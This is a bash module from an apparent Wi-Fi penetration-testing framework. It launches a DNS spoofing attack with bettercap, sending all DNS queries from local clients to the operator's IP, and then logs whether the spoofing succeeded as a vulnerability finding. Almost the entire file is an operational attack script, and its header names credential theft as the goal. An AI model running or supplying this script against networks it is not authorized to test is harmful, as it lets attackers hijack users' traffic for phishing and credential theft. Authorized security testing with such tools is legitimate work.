#!/usr/bin/env bash
# MODULE_META
# NAME="DNS Spoofing / Redirection"
# CATEGORY="G"
# DEPS="G1"
# CRITICAL="no"
# TOOLS="bettercap,dnsmasq"
# DESC="Attempt to redirect DNS queries to a malicious host"
# REQS="managed_iface"
# PCAP="no"
# TIMED="yes"
# DECODE="dns"

#===============================================================================
#  modules/g3_dns_spoofing.sh
#  G3: DNS Spoofing / Redirection (Golden Wrapper)
#
#  METHODOLOGY:
#  1. Use 'bettercap' to intercept and respond to DNS queries from target clients.
#  2. Redirect requests for specific high-value domains (e.g., google.com, 
#     internal.corp) to a local attacker-controlled IP address.
#  3. Monitor for redirected traffic and potential credential theft.
#===============================================================================

set -euo pipefail


# Inputs from Environment
INTERFACE="${WIFI_INTERFACE:-}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
EVIDENCE_PREFIX="${EVIDENCE_DIR}/g3"
SCAN_TIME="${SCAN_TIME:-60}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="G3"

if [[ -z "$INTERFACE" ]]; then
    echo "[!] WIFI_INTERFACE not set."
    exit 1
fi

echo "[*] Starting DNS spoofing attempt on ${INTERFACE}..."

CAPLET_FILE="${EVIDENCE_PREFIX}_bettercap.cap"
JSON_LOG="${EVIDENCE_DIR}/${TC_ID}_bettercap.json"
LOG_FILE="${EVIDENCE_DIR}/${TC_ID}_bettercap.log"

# Determine attacker's IP on this interface — DNS spoofing must point to the
# attacker's machine, not 127.0.0.1 (which resolves to the CLIENT's own loopback).
LOCAL_IP=$(ip -4 addr show "$INTERFACE" 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1)
if [[ -z "$LOCAL_IP" ]]; then
    echo "[!] Could not determine local IP on $INTERFACE. Cannot spoof DNS to unreachable address."
    exit 1
fi
echo "[*] DNS spoofing will redirect to attacker IP: ${LOCAL_IP}"

# Cleanup function
cleanup() {
    echo "[*] Cleaning up bettercap processes..."
    [[ -n "${TOOL_PID:-}" ]] && kill "$TOOL_PID" 2>/dev/null || true
    [[ -n "${TEL_PID:-}" ]] && kill "$TEL_PID" 2>/dev/null || true
}
trap cleanup EXIT

# 1. Use bettercap for DNS spoofing
if command -v bettercap &>/dev/null; then
    echo "[*] Starting bettercap DNS spoofing (redirecting to ${LOCAL_IP})..."

    # Create caplet
    cat <<EOF > "$CAPLET_FILE"
set dns.spoof.all true
set dns.spoof.address $LOCAL_IP
set events.stream.output $JSON_LOG
dns.spoof on
events.stream on
EOF

    # 1. 🛰️ DYNAMIC TELEMETRY HEARTBEAT (Background)
    (
        ELAPSED=0
        while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $SCAN_TIME ]]; do
            PERCENT=$(( ELAPSED * 100 / SCAN_TIME ))
            [[ $PERCENT -gt 90 ]] && PERCENT=90
            STATUS="DNS Spoofing in progress... ($(( SCAN_TIME - ELAPSED ))s left)"
            "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PERCENT" --status "$STATUS"
            sleep 2
            ((ELAPSED+=2))
        done
    ) &
    TEL_PID=$!

    # 2. RUN PRIMARY TOOL (Foreground in Window, Background with Wait otherwise)
    if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
        if [[ "${ASTRA_INDEFINITE:-}" == "true" ]]; then
            bettercap -iface "$INTERFACE" -caplet "$CAPLET_FILE" 2>&1 | tee "$LOG_FILE" || true
        else
            timeout --foreground "$SCAN_TIME" bettercap -iface "$INTERFACE" -caplet "$CAPLET_FILE" 2>&1 | tee "$LOG_FILE" || true
        fi
    else
        if [[ "${ASTRA_INDEFINITE:-}" == "true" ]]; then
            bettercap -iface "$INTERFACE" -caplet "$CAPLET_FILE" > "$LOG_FILE" 2>&1 &
        else
            timeout "$SCAN_TIME" bettercap -iface "$INTERFACE" -caplet "$CAPLET_FILE" > "$LOG_FILE" 2>&1 &
        fi
        TOOL_PID=$!
        wait "$TOOL_PID" || true
    fi

    kill "$TEL_PID" 2>/dev/null || true
    cleanup
    trap - EXIT
    
    "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 95 --status "Checking DNS redirection results..."

    # 2. Reporting
    # Check the LOG for actual dns.spoof events — the events JSON file is always
    # created non-empty by bettercap on startup, so file existence is not a reliable
    # indicator of whether any DNS queries were actually spoofed.
    if grep -qiE "dns\.spoof|dns.*spoofed|spoofed.*query" "$LOG_FILE" 2>/dev/null; then
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "DNS Spoofing Active" \
            --severity HIGH \
            --desc "Successfully executed DNS redirection attack against local clients on $INTERFACE. Bettercap confirmed active DNS spoofing events." \
            --target "Local Clients" \
            --evidence "$LOG_FILE" \
            --rationale "DNS spoofing allows an attacker to redirect users to malicious clones of legitimate websites. This is a primary vector for phishing, credential theft, and malware distribution."
    else
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "[G3] Audit Complete" \
            --severity INFO \
            --desc "DNS spoofing attack cycle finished. No active DNS queries were intercepted or spoofed during the test window." \
            --target "Local Clients" \
            --evidence "$LOG_FILE" \
            --rationale "Modern clients and browsers use DNS-over-HTTPS (DoH) or DNS-over-TLS (DoT), which mitigates traditional DNS spoofing. This audit confirms whether the target environment is susceptible to basic UDP-based DNS redirection."
    fi
else
    echo "[!] bettercap not found. Skipping DNS spoofing test."
    echo "bettercap not installed" > "$LOG_FILE"
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[G3] Audit Skipped — bettercap Missing" \
        --severity INFO \
        --desc "DNS spoofing test could not run — bettercap is not installed. Install with: apt install bettercap" \
        --target "Local Clients" \
        --evidence "$LOG_FILE" \
        --rationale "bettercap is required for DNS spoofing and response injection on the local segment."
    "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Skipped — bettercap missing"
fi

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "DNS Spoofing test complete."

# Hold window if in tactical mode so user can see final output/errors
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    echo -e "\n${ASTRA_COLOR_BOLD:-}[*] Mission Complete. Window will close in 5s...${ASTRA_COLOR_RESET:-}"
    sleep 5
fi

exit 0
